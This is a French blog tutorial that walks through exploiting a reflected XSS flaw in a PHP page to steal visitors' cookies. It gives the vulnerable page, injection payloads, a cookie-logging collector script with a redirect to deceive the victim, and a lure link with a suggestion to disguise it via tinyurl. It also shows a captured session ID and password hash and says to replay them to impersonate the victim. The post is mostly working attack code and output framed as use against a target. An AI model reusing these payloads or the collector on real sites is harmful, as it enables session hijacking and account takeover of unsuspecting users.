---
layout: post
category : tutoriel
tagline: ""
tags : [latex]
---
{% include JB/setup %}

Des failles, on en laisse à la pelle. Pour preuve, j'en ai encore corrigé hier sur ce site et je suis convaincu qu'il en reste et qu'il en restera toujours (PS : l'utilisation d'un framework simplifie largement la sécurisation d'un site). 

Essayons d'exploiter la faille XSS pour effectuer un vol de cookie !

*****

# Repérer la faille

Le but est de trouver une page sur un site ou nous pouvons injecter du code javascript, prenons cette page par exemple :

    <?php
     
    if ( isset($_GET['message']) ) {
    	echo $_GET[message];
    } else {
    	echo '<a href="vuln.php?message=Bonjour">Dire bonjour</a>';
    }
     
    ?>

Parfait nous avons notre exemple.
Essayons de l'appeler avec quelques paramètres :

    http://127.0.0.1/microdev/xavier/hacking/vuln.php?message=%3Cscript%3Ealert(1)%3C/script%3E
	
![Faille détectée !](/assets/posts/xss1.png)

Oh la jolie alerte Il y a surement moyen de faire quelque chose avec ça !

Essayons d'aller plus loin, que pouvons nous obtenir de la page ?

    http://127.0.0.1/microdev/xavier/hacking/vuln.php?message=%3Cscript%3Ealert(document.cookie)%3C/script%3E
	
![Faille détectée !](/assets/posts/xss2.png)

Vous avez compris que ça devient intéressant !

# Préparation du piège

Notre objectif je le rappel est de voler les cookies de notre cible. A ce point nous pourrions modifier le contenu de la page en envoyant une url personnalisée à un visiteur et bien d'autres choses. 

En volant les cookies nous pourrions nous faire passé par notre victime et donc nous connecter à sa place.

Imaginons l'idée suivante, on va diriger l'utilisateur vers une page en lui prenant ses cookies au passage, puis on enregistra ses cookies et on le redirigera vers la destination de notre choix afin qu'il ne se doute de rien.

    <?php
     
    if(isset($_GET['c']) && is_string($_GET['c']) && !empty($_GET['c'])) {
     
    	$referer = $_SERVER['HTTP_REFERER'];
    	$date = date('d-m-Y \à H\hi');
    	$data = "From :   $referer\r\nDate :   $date\r\nCookie : ".htmlentities($_GET['c'])."\r\n------------------------------\r\n";
     
    	$handle = fopen('cookies.txt','a');
    	fwrite($handle, $data);
    	fclose($handle);
     
    }
     
     
    // et on envoie la cible où l'on veut pour détourner son attention ;)
    ?>
    <script language="javascript" type="text/javascript">
    	window.location.replace("http://www.plop.org");
    </script>

Pour piéger notre victime, il suffira de lui envoyer un lien de ce type :

    http://127.0.0.1/microdev/xavier/hacking/vuln.php?message=%3Cscript%3Ewindow.location.replace(%22http://127.0.0.1/microdev/xavier/hacking/volCookies.php?c=%22%2Bdocument.cookie.toString());%3C/script%3E
	
Bien sur un petit coup de tinyurl et il ne se doutera de rien !


# Résultat

Voyons si la pêche à été bonne, regardons le contenu de notre fichier texte : 

    From :   http://127.0.0.1/microdev/xavier/hacking/vuln.php?message=%3Cscript%3Ewindow.location.replace(%22http://127.0.0.1/microdev/xavier/hacking/volCookies.php?c=%22%2Bdocument.cookie.toString());%3C/script%3E
    Date :   10-10-2010 à 00h27
    Cookie : saffir_login=victime; saffir_pass=ab4f63f9ac65152575886860dde480a1; __utmz=96992031.1282937148.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=fdbceu2i112mt0j6vavr7mgp76; __utma=96992031.1472722046.1286240095.1286645182.1286656603.10; __utmc=96992031; __utmb=96992031.176.10.1286656603
    ------------------------------

Il ne nous reste qu'a remplacer nos cookies par ceux de la victime pour se faire passer pour elle, fatale.

Pour plus de détails, voir l’article sur [développez](http://julien-pauli.developpez.com/tutoriels/securite/developpement-web-securite/?page=xss).


[test 404](/non-existing-file).
